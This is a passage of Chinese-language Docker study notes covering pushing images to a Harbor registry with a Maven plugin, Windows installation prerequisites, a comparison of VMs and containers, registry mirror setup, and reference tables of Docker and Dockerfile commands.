class="language-xml">                         <span class="tag">&lt;<span class="name">port</span>&gt;</span>8080:8080<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="tag">&lt;/<span class="name">ports</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="comment">&lt;!--设置容器间连接--&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="tag">&lt;<span class="name">links</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                         <span class="tag">&lt;<span class="name">link</span>&gt;</span>mysql:db<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="tag">&lt;/<span class="name">links</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="comment">&lt;!--设置容器和宿主机目录挂载--&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="tag">&lt;<span class="name">volumes</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                         <span class="tag">&lt;<span class="name">bind</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                             <span class="tag">&lt;<span class="name">volume</span>&gt;</span>/etc/localtime:/etc/localtime<span class="tag">&lt;/<span class="name">volume</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                             <span class="tag">&lt;<span class="name">volume</span>&gt;</span>/mydata/app/$&#123;project.artifactId&#125;/logs:/var/logs<span class="tag">&lt;/<span class="name">volume</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                         <span class="tag">&lt;/<span class="name">bind</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                     <span class="tag">&lt;/<span class="name">volumes</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                 <span class="tag">&lt;/<span class="name">run</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">             <span class="tag">&lt;/<span class="name">image</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">         <span class="tag">&lt;/<span class="name">images</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">     <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span></span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure>

<p>复制</p>
<ul>
<li>推送镜像之前需要在Harbor中创建好项目，否则会无法推送镜像;<code>mall-tiny</code></li>
</ul>
<p><img data-src="https://ask.qcloudimg.com/http-save/yehe-5866756/03pjtyjwv4.png?imageView2/2/w/1620" alt="img"></p>
<ul>
<li>之后使用Maven插件打包镜像并推送到Harbor仓库，具体可以参考<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU1Nzg4NjgyMw==&mid=2247486525&idx=1&sn=01103c0629f36a8e9d511acb26fae225&scene=21#wechat_redirect"><strong>《还在手动部署SpringBoot应用？试试这个自动化插件！》</strong></a>，推送过程中输出信息如下;</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[<span class="variable constant_">INFO</span>] <span class="title class_">Scanning</span> <span class="keyword">for</span> projects...</span><br><span class="line">[<span class="variable constant_">INFO</span>]                                                                         </span><br><span class="line">[<span class="variable constant_">INFO</span>] ------------------------------------------------------------------------</span><br><span class="line">[<span class="variable constant_">INFO</span>] <span class="title class_">Building</span> mall-tiny-fabric <span class="number">0.0</span><span class="number">.1</span>-<span class="variable constant_">SNAPSHOT</span></span><br><span class="line">[<span class="variable constant_">INFO</span>] ------------------------------------------------------------------------</span><br><span class="line">[<span class="variable constant_">INFO</span>] </span><br><span class="line">[<span class="variable constant_">INFO</span>] --- docker-maven-<span class="attr">plugin</span>:<span class="number">0.33</span><span class="number">.0</span>:push (<span class="keyword">default</span>-cli) @ mall-tiny-fabric ---</span><br><span class="line"></span><br><span class="line">[<span class="variable constant_">INFO</span>] <span class="variable constant_">DOCKER</span>&gt; <span class="title class_">The</span> push refers to repository [<span class="number">192.168</span><span class="number">.3</span><span class="number">.101</span>:<span class="number">80</span>/mall-tiny/mall-tiny-fabric]</span><br><span class="line">###############</span><br><span class="line">[<span class="variable constant_">INFO</span>] <span class="variable constant_">DOCKER</span>&gt; <span class="number">0.0</span><span class="number">.1</span>-<span class="attr">SNAPSHOT</span>: <span class="attr">digest</span>: <span class="attr">sha256</span>:3a54682fd3b04526f6da0916e98f3d0d5ba4193a8ad6aafbe6c05a1badf6c13b <span class="attr">size</span>: <span class="number">2212</span></span><br><span class="line"></span><br><span class="line">[<span class="variable constant_">INFO</span>] <span class="variable constant_">DOCKER</span>&gt; <span class="title class_">Temporary</span> image tag skipped. <span class="title class_">Target</span> image <span class="string">&#x27;192.168.3.101:80/mall-tiny/mall-tiny-fabric:0.0.1-SNAPSHOT&#x27;</span> already has registry set or no registry is available</span><br><span class="line">[<span class="variable constant_">INFO</span>] <span class="variable constant_">DOCKER</span>&gt; <span class="title class_">Pushed</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.101</span>:<span class="number">80</span>/mall-tiny/mall-tiny-<span class="attr">fabric</span>:<span class="number">0.0</span><span class="number">.1</span>-<span class="variable constant_">SNAPSHOT</span> <span class="keyword">in</span> <span class="number">2</span> minutes and <span class="number">8</span> seconds </span><br><span class="line">[<span class="variable constant_">INFO</span>] ------------------------------------------------------------------------</span><br><span class="line">[<span class="variable constant_">INFO</span>] <span class="variable constant_">BUILD</span> <span class="variable constant_">SUCCESS</span></span><br><span class="line">[<span class="variable constant_">INFO</span>] ------------------------------------------------------------------------</span><br><span class="line">[<span class="variable constant_">INFO</span>] <span class="title class_">Total</span> <span class="attr">time</span>: <span class="number">02</span>:<span class="number">11</span> min</span><br><span class="line">[<span class="variable constant_">INFO</span>] <span class="title class_">Finished</span> <span class="attr">at</span>: <span class="number">2020</span>-<span class="number">12</span>-02<span class="attr">T15</span>:<span class="number">11</span>:<span class="number">10</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">[<span class="variable constant_">INFO</span>] <span class="title class_">Final</span> <span class="title class_">Memory</span>: 19M/219M</span><br><span class="line">[<span class="variable constant_">INFO</span>] ------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="title class_">Process</span> finished <span class="keyword">with</span> exit code <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>复制</p>
<ul>
<li>打开Harbor管理页面，发现镜像已经存在了。<code>mall-tiny-fabric</code></li>
</ul>
<p><img data-src="https://ask.qcloudimg.com/http-save/yehe-5866756/9cauhey9il.png?imageView2/2/w/1620" alt="img"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>Harbor提供了管理界面让我们可以更方便地管理Docker镜像，同时添加了基于角色的权限管理功能来保护镜像的安全。之前我们为了安全地使用镜像，需要使用繁琐的TLS来控制远程Docker服务打包镜像，具体参考<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU1Nzg4NjgyMw==&mid=2247486279&idx=1&sn=22e37363d3c32970729d7897d6ce0c0e&scene=21#wechat_redirect"><strong>《Docker服务开放了这个端口，服务器分分钟变肉机！》</strong></a>。现在我们只要搭建一个Harbor镜像仓库，然后本地打包好镜像上传到Harbor，需要使用镜像的时候直接从Harbor下载即可！</p>
<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p>官方文档：<span class="exturl" data-url="aHR0cHM6Ly9nb2hhcmJvci5pby9kb2NzLzIuMS4wL2luc3RhbGwtY29uZmlnLw==">https://goharbor.io/docs/2.1.0/install-config/</span></p>
<h4 id="项目源码地址"><a href="#项目源码地址" class="headerlink" title="项目源码地址"></a>项目源码地址</h4><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hY3JvemhlbmcvbWFsbC1sZWFybmluZy90cmVlL21hc3Rlci9tYWxsLXRpbnktZmFicmlj">https://github.com/macrozheng/mall-learning/tree/master/mall-tiny-fabric</span></p>
<h1 id="run的流程和docker原理"><a href="#run的流程和docker原理" class="headerlink" title="run的流程和docker原理"></a>run的流程和docker原理</h1><h2 id="1、run的流程"><a href="#1、run的流程" class="headerlink" title="1、run的流程"></a>1、run的流程</h2><p><img data-src="https://mmbiz.qpic.cn/mmbiz_png/c5hh5ZpXfqtNEXALlibyHtZI83KmhT3Lw3e8LXo7H3echOYrgdVh4THOhib60nibhmVUibTQVZmQp2Xhibowu5WGo0Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h2 id="2、docker原理"><a href="#2、docker原理" class="headerlink" title="2、docker原理"></a>2、docker原理</h2><p><img data-src="https://mmbiz.qpic.cn/mmbiz_png/c5hh5ZpXfqtNEXALlibyHtZI83KmhT3LwD71icMxfB21AicyLRXvZojGk4Ria6RZyhTkMfht25BR5FcdUnnrUf5kaw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h2 id="3、docker为何比VM快"><a href="#3、docker为何比VM快" class="headerlink" title="3、docker为何比VM快"></a>3、docker为何比VM快</h2><ol>
<li>Docker有着比虚拟机更少的抽象层</li>
<li>docker利用的是宿主机的内核，VM需要的是Guest OS。</li>
</ol>
<p><img data-src="https://mmbiz.qpic.cn/mmbiz_png/c5hh5ZpXfqtNEXALlibyHtZI83KmhT3LwBpW5qptqEWfzraIcQAEz7dibJYZcTUJiaQ50qQuzOibKL2bbDWJttGv5w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h1 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h1><p>安装请参考官网安装指南</p>
<p>Ubuntu安装</p>
<p>Debian安装</p>
<h2 id="docker版本"><a href="#docker版本" class="headerlink" title="docker版本"></a>docker版本</h2><p>ce社区版，ee企业版，推荐安装企业版</p>
<h2 id="windows安装"><a href="#windows安装" class="headerlink" title="windows安装"></a>windows安装</h2><p>windows安装docker，只能安装docker desktop<br>exe安装文件根据自己需求安装就行</p>
<h3 id="重点："><a href="#重点：" class="headerlink" title="重点："></a>重点：</h3><h4 id="hyper-v开启："><a href="#hyper-v开启：" class="headerlink" title="hyper-v开启："></a>hyper-v开启：</h4><p>windows需要开启虚拟机功能才能够启用docker（因为docker是采用的虚拟机形式来产生容器）<br>1.打开控制面板，选择里面的程序打开；<br><img data-src="http://127.0.0.1:3000/image-20220508155859695.png" alt="image-20220508155859695.png"><br>2.点击启用或者关闭windows功能选项打开；<br>3.勾选Hyper -V管理工具文件夹即可开启虚拟机，之后重启下电脑即可；<br><img data-src="http://127.0.0.1:3000/image-20220508160059030.png" alt="image-20220508160059030.png"></p>
<h4 id="wsl2："><a href="#wsl2：" class="headerlink" title="wsl2："></a>wsl2：</h4><p>docker支持的是Linux内核，并不支持windows内核，所有需要安装wsl2，进行安装一个Linux子系统来提供Linux内核功能给docker运行<br><strong>wsl安装官文：</strong><br>**<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vd2luZG93cy93c2wvaW5zdGFsbA==">https://docs.microsoft.com/zh-cn/windows/wsl/install</span></p>
<blockquote>
<p>记得要安装Linux子系统</p>
</blockquote>
<h1 id="虚拟机与容器技术的区别"><a href="#虚拟机与容器技术的区别" class="headerlink" title="虚拟机与容器技术的区别"></a>虚拟机与容器技术的区别</h1><p><img data-src="C:\Users\shell'co'de\AppData\Roaming\Typora\typora-user-images\image-20220714142931314.png" alt="image-20220714142931314"></p>
<h3 id="什么是虚拟机？"><a href="#什么是虚拟机？" class="headerlink" title="什么是虚拟机？"></a><strong>什么是虚拟机？</strong></h3><p>虚拟机（VM）是计算机系统的仿真。简而言之，它可以在实际上是一台计算机的硬件上运行看起来很多单独的计算机。<br>操作系统（OS）及其应用程序从单个主机服务器或主机服务器池共享硬件资源。每个VM都需要自己的底层操作系统，并且硬件是虚拟化的。管理程序或虚拟机监视器是创建和运行VM的软件，固件或硬件。它位于硬件和虚拟机之间，是虚拟化服务器所必需的。</p>
<p>自从负担得起的虚拟化技术和云计算服务出现以来，大大小小的IT部门都将虚拟机（VM）作为降低成本和提高效率的一种方式。</p>
<p><img data-src="https://pic3.zhimg.com/80/v2-64fe3fc49352163fe2675557dd4a3d36_720w.jpg" alt="img"></p>
<p>但是，VM可能占用大量系统资源。每个VM不仅运行操作系统的完整副本，还运行操作系统需要运行的所有硬件的虚拟副本。这很快就会增加大量的RAM和CPU周期。与运行单独的实际计算机相比，这仍然是经济的，但对于某些应用程序来说，这可能是过度的，这导致了容器的开发。<br>虚拟机的好处</p>
<ul>
<li>应用程序可用的所有OS资源</li>
<li>建立管理工具</li>
<li>建立安全工具</li>
<li>更熟知的安全控制</li>
</ul>
<p>流行的VM提供商</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vd3d3LnZtd2FyZS5jb20vcHJvZHVjdHMvdnNwaGVyZS5odG1s">VMware vSphere</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vd3d3LnZpcnR1YWxib3gub3JnLw==">VirtualBox</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vd3d3LnhlbnByb2plY3Qub3JnLw==">Xen</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vZG9jcy5taWNyb3NvZnQuY29tL2VuLXVzL3ZpcnR1YWxpemF0aW9uL2h5cGVyLXYtb24td2luZG93cy9hYm91dC8=">Hyper-V</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vd3d3LmxpbnV4LWt2bS5vcmcvcGFnZS9NYWluX1BhZ2U=">KVM</span></li>
</ul>
<h3 id="什么是容器？"><a href="#什么是容器？" class="headerlink" title="什么是容器？"></a><strong>什么是容器？</strong></h3><p>使用容器，而不是像虚拟机（VM）那样虚拟化底层计算机，只是虚拟化操作系统。</p>
<p>容器位于物理服务器及其主机操作系统之上 - 通常是Linux或Windows。每个容器共享主机操作系统内核，通常也包括二进制文件和库。共享组件是只读的。共享操作系统资源（如库）可以显着减少重现操作系统代码的需要，并且意味着服务器可以通过单个操作系统安装来运行多个工作负载。因此容器非常轻 - 它们只有几兆字节，只需几秒钟即可启动。与容器相比，VM需要几分钟才能运行，并且比同等容器大一个数量级。</p>
<p>与VM相比，容器所需的全部功能都足以支持程序和库以及运行特定程序的系统资源。实际上，这意味着您可以将容器上的应用程序的容量设置为使用容器的两到三倍，而不是使用VM。此外，使用容器，您可以为开发，测试和部署创建可移植，一致的操作环境。</p>
<p><img data-src="https://pic2.zhimg.com/80/v2-62838df5aa6b1d8401d0d058f5e23ccd_720w.jpg" alt="img"></p>
<h3 id="容器类型"><a href="#容器类型" class="headerlink" title="容器类型"></a>容器类型</h3><p><strong>Linux容器（LXC）</strong> - 最初的Linux容器技术是Linux容器，通常称为LXC。LXC是一种Linux操作系统级虚拟化方法，用于在单个主机上运行多个隔离的Linux系统。</p>
<p><strong>Docker</strong> - Docker最初是作为一个构建单应用程序LXC容器的项目，向LXC引入了一些变化，使容器更易于使用和灵活使用。它后来变成了自己的容器运行时环境。在较高的层次上，Docker是一个可以高效创建，发布和运行容器的Linux实用程序。</p>
<p><strong>容器的好处</strong></p>
<ul>
<li>减少IT管理资源</li>
<li>缩小了快照的大小</li>
<li>更快地启动应用程序</li>
<li>减少和简化安全更新</li>
<li>减少传输，迁移，上传工作负载的代码</li>
</ul>
<p><strong>热门容器供应商</strong></p>
<ul>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vbGludXhjb250YWluZXJzLm9yZy8=">Linux容器</span></p>
</li>
<li><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vbGludXhjb250YWluZXJzLm9yZy9seGMv">LXC</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vbGludXhjb250YWluZXJzLm9yZy9seGQvaW50cm9kdWN0aW9uLw==">LXD</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vbGludXhjb250YWluZXJzLm9yZy9jZ21hbmFnZXIvaW50cm9kdWN0aW9uLw==">CGManager</span></li>
</ul>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vd3d3LmRvY2tlci5jb20v">docker</span></p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vZG9jcy5taWNyb3NvZnQuY29tL2VuLXVzL3ZpcnR1YWxpemF0aW9uL3dpbmRvd3Njb250YWluZXJzL2Fib3V0Lw==">Windows Server容器</span></p>
</li>
</ul>
<p><strong>用于VMs与容器的使用</strong><br>容器和VM都有优点和缺点，最终的决定取决于您的具体需求，但有一些一般的经验法则。</p>
<ul>
<li>当您需要在服务器上运行多个应用程序或需要管理各种操作系统时，VM是运行需要所有操作系统资源和功能的应用程序的更好选择。</li>
<li>当您最大的优先事项是最大化在最少数量的服务器上运行的应用程序数量时，容器是更好的选择。</li>
</ul>
<p><strong>差异：虚拟机与容器虚拟机集装箱</strong></p>
<p><img data-src="https://pic3.zhimg.com/80/v2-a63f10a9806d1c95414909196c923cb2_720w.jpg" alt="img"></p>
<p><strong>对于大多数人来说，理想的设置可能包括两者。</strong></p>
<p><strong>利用当前的虚拟化技术状态，VM的灵活性和容器的最小资源需求协同工作，为环境提供最大的功能。</strong></p>
<h1 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h1><p>docker默认的官方代理，在国内网速不好，修改配置，改为网易源（代理源看个人，你喜欢华为、阿里、中科、清华等没问题）<br><img data-src="http://127.0.0.1:3000/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220508160744.png" alt="微信截图_20220508160744.png"></p>
<blockquote>
<p>一定要保证该文件符合 json 规范，否则 Docker 将不能启动。</p>
</blockquote>
<h2 id="docker镜像获取代理问题"><a href="#docker镜像获取代理问题" class="headerlink" title="docker镜像获取代理问题"></a>docker镜像获取代理问题</h2><p>Docker 默认从 Docker Hub 上拖取所需要的镜像。但由于网络原因，拖取的过程可能会比较慢。一些服务在中国提供了 Docker Hub 的镜像（反代缓存）。以下内容以网易云与百度云为例。</p>
<p>为了使用这些 Docker Hub 镜像，在 Debian/Ubuntu 上，可以编辑 <code>/etc/docker/daemon.json</code> 文件（如果文件不存在，请新建一个），写入以下内容。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://hub-mirror.c.163.com&quot;,</span><br><span class="line">    &quot;https://mirror.baidubce.com&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 <code>sudo systemctl restart docker</code> 命令重启 Docker 服务后，再次运行 <code>docker info</code> 命令，可以看到如下输出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Registry Mirrors:</span><br><span class="line"> https://hub-mirror.c.163.com/</span><br><span class="line"> https://mirror.baidubce.com/</span><br></pre></td></tr></table></figure>

<p>如果你看到了上面的输出，说明你的 Docker Registry Mirror 已经配置好了。</p>
<h1 id="docker命令"><a href="#docker命令" class="headerlink" title="docker命令"></a>docker命令</h1><h2 id="容器生命周期管理"><a href="#容器生命周期管理" class="headerlink" title="容器生命周期管理"></a>容器生命周期管理</h2><ul>
<li>docker run 运行一个容器</li>
<li>docker stop/start/restart 容器id 关闭/运行/重启容器</li>
<li>docker kill   </li>
<li>docker rm   删除容器</li>
<li>docker pause/unpause</li>
<li>docker create    创建容器</li>
<li>docker exec    创建进程</li>
</ul>
<h2 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h2><ul>
<li><strong>docker ps</strong>      查看运行的容器</li>
<li><strong>docker inspect</strong></li>
<li>docker top</li>
<li>docker attach</li>
<li>docker events</li>
<li>docker logs    查看容器运行日志</li>
<li>docker wait</li>
<li>docker export    查看容器映射端口</li>
<li>docker port    查看容器运行端口</li>
</ul>
<h2 id="容器rootfs命令"><a href="#容器rootfs命令" class="headerlink" title="容器rootfs命令"></a>容器rootfs命令</h2><ul>
<li>docker commit</li>
<li>docker cp       本地文件夹映射容器文件夹</li>
<li>docker diff</li>
</ul>
<h2 id="镜像仓库"><a href="#镜像仓库" class="headerlink" title="镜像仓库"></a>镜像仓库</h2><ul>
<li>docker login   登录镜像站（hub.docker.org）</li>
<li>docker pull    拉取镜像</li>
<li>docker push</li>
<li>docker search   搜寻镜像</li>
</ul>
<h2 id="本地镜像管理"><a href="#本地镜像管理" class="headerlink" title="本地镜像管理"></a>本地镜像管理</h2><ul>
<li>docker images 列出本地镜像<ul>
<li>-a 列出本地所有的镜像(含中间映像层,默认情况下,过滤掉中间映像层)</li>
<li>–digests 显示镜像的摘要信息</li>
<li>-f 显示满足条件的镜像</li>
<li>–format 指定返回值的模板文件</li>
<li>–no-trunc 显示完整的镜像信息</li>
<li>-q 只显示镜像id</li>
</ul>
</li>
<li>docker rmi 删除本地一个或多少镜像<ul>
<li>-f 强制删除</li>
<li>–no-prune 不移除该镜像的过程镜像,默认移除</li>
</ul>
</li>
<li><strong>docker tag 标记本地镜像,将其归入某一仓库</strong></li>
<li>docker build 使用Dockerfile创建镜像<ul>
<li>–build-arg=[] 设置镜像创建时的变量;</li>
<li>–cpu-shares 设置 cpu 使用权重;</li>
<li>–cpu-period 限制 CPU CFS周期;</li>
<li>–cpu-quota 限制 CPU CFS配额;</li>
<li>–cpuset-cpus 指定使用的CPU id;</li>
<li>–cpuset-mems 指定使用的内存 id;</li>
<li>–disable-content-trust 忽略校验,默认开启;</li>
<li>-f 指定要使用的Dockerfile路径;</li>
<li>–force-rm 设置镜像过程中删除中间容器;</li>
<li>–isolation 使用容器隔离技术;</li>
<li>–label=[] :设置镜像使用的元数据;</li>
<li>-m 设置内存最大值;</li>
<li>–memory-swap 设置Swap的最大值为内存+swap,”-1”表示不限swap;</li>
<li>–no-cache 创建镜像的过程不使用缓存;</li>
<li>–pull 尝试去更新镜像的新版本;</li>
<li>-q 安静模式,成功后只输出镜像ID;</li>
<li>–rm 设置镜像成功后删除中间容器;</li>
<li>–shm-size 设置/dev/shm的大小,默认值是64M;</li>
<li>–ulimit Ulimit配置。</li>
</ul>
</li>
<li>docker history 查看指定镜像的创建历史<ul>
<li>-H 以可读的格式打印镜像大小和日期,默认为true</li>
<li>–no-trunc 显示完整的提交记录</li>
<li>-q 仅列出提交记录ID</li>
</ul>
</li>
<li>docker save 将指定镜像保存成 tar 归档文件<ul>
<li>-o 输出到的文件</li>
</ul>
</li>
<li>docker import 从归档文件中创建镜像<ul>
<li>-c 应用docker指令创建镜像</li>
<li>-m 提交时的说明文字</li>
</ul>
</li>
</ul>
<h3 id="info-version"><a href="#info-version" class="headerlink" title="info|version"></a>info|version</h3><ul>
<li><strong>docker info 显示 Docker 系统信息,包括镜像和容器数</strong></li>
<li><strong>docker version 显示 Docker 版本信息</strong></li>
</ul>
<h2 id="⭐docker命令小结"><a href="#⭐docker命令小结" class="headerlink" title="⭐docker命令小结"></a>⭐docker命令小结</h2><table>
<thead>
<tr>
<th align="left">常用命令</th>
<th align="left">命令含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">build</td>
<td align="left">通过Dockerfile定制镜像</td>
</tr>
<tr>
<td align="left">commit</td>
<td align="left">提交当前容器为新的镜像</td>
</tr>
<tr>
<td align="left">cp</td>
<td align="left">从容器中拷贝指定文件或者目录到宿主机中</td>
</tr>
<tr>
<td align="left">create</td>
<td align="left">创建一个新的容器，同run 但不启动容器</td>
</tr>
<tr>
<td align="left">diff</td>
<td align="left">查看docker容器变化</td>
</tr>
<tr>
<td align="left">events</td>
<td align="left">从docker服务获取容器实时事件</td>
</tr>
<tr>
<td align="left">exec</td>
<td align="left">在已存在的容器上运行命令</td>
</tr>
<tr>
<td align="left">export</td>
<td align="left">导出容器的内容流作为一个tar归档文件(对应import)</td>
</tr>
<tr>
<td align="left">history</td>
<td align="left">展示一个镜像形成历史</td>
</tr>
<tr>
<td align="left">images</td>
<td align="left">列出系统当前镜像</td>
</tr>
<tr>
<td align="left">import</td>
<td align="left">从tar包中的内容创建一个新的文件系统映像(对应export)</td>
</tr>
<tr>
<td align="left">info</td>
<td align="left">显示系统相关信息</td>
</tr>
<tr>
<td align="left">inspect</td>
<td align="left">查看容器详细信息</td>
</tr>
<tr>
<td align="left">kill</td>
<td align="left">强制停止指定docker容器</td>
</tr>
<tr>
<td align="left">load</td>
<td align="left">从一个tar包中加载一个镜像(对应save)</td>
</tr>
<tr>
<td align="left">login</td>
<td align="left">注册或者登陆一个docker源服务器</td>
</tr>
<tr>
<td align="left">logout</td>
<td align="left">从当前Docker registry退出</td>
</tr>
<tr>
<td align="left">logs</td>
<td align="left">输出当前容器日志信息</td>
</tr>
<tr>
<td align="left">pause</td>
<td align="left">暂停容器</td>
</tr>
<tr>
<td align="left">port</td>
<td align="left">查看映射端口对应的容器内部源端口</td>
</tr>
<tr>
<td align="left">ps</td>
<td align="left">列出容器列表</td>
</tr>
<tr>
<td align="left">pull</td>
<td align="left">从docker镜像源服务器拉取指定镜像或者库镜像</td>
</tr>
<tr>
<td align="left">push</td>
<td align="left">推送指定镜像或者库镜像至docker源服务器</td>
</tr>
<tr>
<td align="left">rename</td>
<td align="left">重命名容器</td>
</tr>
<tr>
<td align="left">restart</td>
<td align="left">重启运行的容器</td>
</tr>
<tr>
<td align="left">rm</td>
<td align="left">移除一个或者多个容器</td>
</tr>
<tr>
<td align="left">rmi</td>
<td align="left">移除一个或多个镜像(无容器使用该镜像才可以删除，否则需要删除相关容器才可以继续或者-f强制删除)</td>
</tr>
<tr>
<td align="left">run</td>
<td align="left">创建一个新的容器并运行一个命令</td>
</tr>
<tr>
<td align="left">save</td>
<td align="left">保存一个镜像为一个tar包(对应load)</td>
</tr>
<tr>
<td align="left">search</td>
<td align="left">在docker hub中搜索镜像</td>
</tr>
<tr>
<td align="left">start</td>
<td align="left">启动容器</td>
</tr>
<tr>
<td align="left">stats</td>
<td align="left">统计容器使用资源</td>
</tr>
<tr>
<td align="left">stop</td>
<td align="left">停止容器</td>
</tr>
<tr>
<td align="left">tag</td>
<td align="left">给源中镜像打标签</td>
</tr>
<tr>
<td align="left">top</td>
<td align="left">查看容器中运行的进程信息</td>
</tr>
<tr>
<td align="left">unpause</td>
<td align="left">取消暂停容器</td>
</tr>
<tr>
<td align="left">version</td>
<td align="left">查看容器版本号</td>
</tr>
<tr>
<td align="left">wait</td>
<td align="left">截取容器停止时的退出状态值</td>
</tr>
</tbody></table>
<h2 id="⭐dockerfile常用命令"><a href="#⭐dockerfile常用命令" class="headerlink" title="⭐dockerfile常用命令"></a>⭐dockerfile常用命令</h2><table>
<thead>
<tr>
<th>命令</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>WORKDIR</td>
<td>run entrypint cmd执行的工作目录</td>
</tr>
<tr>
<td>ENV</td>
<td>添加环境变量</td>
</tr>
<tr>
<td>ADD</td>
<td>添加文件，会解压压缩包</td>
</tr>
<tr>
<td>COPY</td>
<td>复制文件</td>
</tr>
<tr>
<td>ONBUILD</td>
<td>触发器</td>
</tr>
<tr>
<td>VOLUME</td>
<td>挂载卷</td>
</tr>
<tr>
<td>FROM</td>
<td>基础镜像</td>
</tr>
<tr>
<td>ENTRYPOINT</td>
<td>基础命令</td>
</tr>
<tr>
<td>RUN</td>
<td>执行命令</td>
</tr>
<tr>
<td>CMD</td>
<td>启动程序命令，拼接在基础命令后</td>
</tr>
<tr>
<td>EXPOSE</td>
<td>暴露端口（开放）</td>
</tr>
<tr>
<td>MAINTAINER</td>
<td>维护者</td>
</tr>
</tbody></table>
<h1 id="⭐本地文件映射至docker容器"><a href="#⭐本地文件映射至docker容器" class="headerlink" title="⭐本地文件映射至docker容器"></a>⭐本地文件映射至docker容器</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>在往docker容器中直接使用rz上传文件时，速度很慢，所以考虑使用从本地上传至容器</p>
<h2 id="拿到容器ID"><a href="#拿到容器ID" class="headerlink" title="拿到容器ID"></a>拿到容器ID</h2><p>docker ps -a查看全部容器的id</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

